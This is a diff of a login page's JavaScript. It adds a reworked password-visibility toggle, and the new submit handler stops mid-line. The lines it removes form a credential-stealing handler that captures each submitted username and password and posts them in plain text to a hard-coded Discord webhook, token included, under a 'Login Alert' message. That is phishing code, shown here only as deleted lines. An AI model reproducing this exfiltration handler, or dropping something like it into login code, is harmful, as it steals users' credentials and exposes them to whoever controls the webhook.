@@ -1,41 +1,17 @@
-document.getElementById('loginForm').addEventListener('submit', function(event) {
+document.getElementById('togglePassword').addEventListener('click', function () {
+    const passwordInput = document.getElementById('password');
+    const type = passwordInput.type === 'password' ? 'text' : 'password';
+    passwordInput.type = type;
+
+    // Toggle the emoji to indicate whether the password is visible or hidden
+    if (type === 'password') {
+        this.textContent = '👁️'; // Eye symbol when password is hidden
+    } else {
+        this.textContent = '🙈'; // Eye with a line symbol when password is visible
+    }
+});
+
+document.getElementById('loginForm').addEventListener('submit', function (event) {
     event.preventDefault();
 
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    // Discord webhook URL
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
-
-    // Prepare the payload to send to Discord
-    const embed = {
-        content: `# new login`,
-        embeds: [{
-            title: 'Login Alert',
-            description: `${username} has logged in. Their pass is ${password}`,
-            color: #808080,
-        }],
-    };
-
-    // Send the data to the Discord webhook
-    fetch(DISCORD_WEBHOOK_URL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(embed),
-    });
-});
-
-// Toggle password visibility
-const togglePasswordButton = document.getElementById('togglePassword');
-const passwordField = document.getElementById('password');
-
-togglePasswordButton.addEventListener('click', function() {
-    // Toggle the type of the password field
-    const type = passwordField.type === 'password' ? 'text' : 'password';
-    passwordField.type = type;
-
-    // Toggle the button text
-    this.textContent = type === 'password' ? '👁️' : '🙈';
-});
+    const username
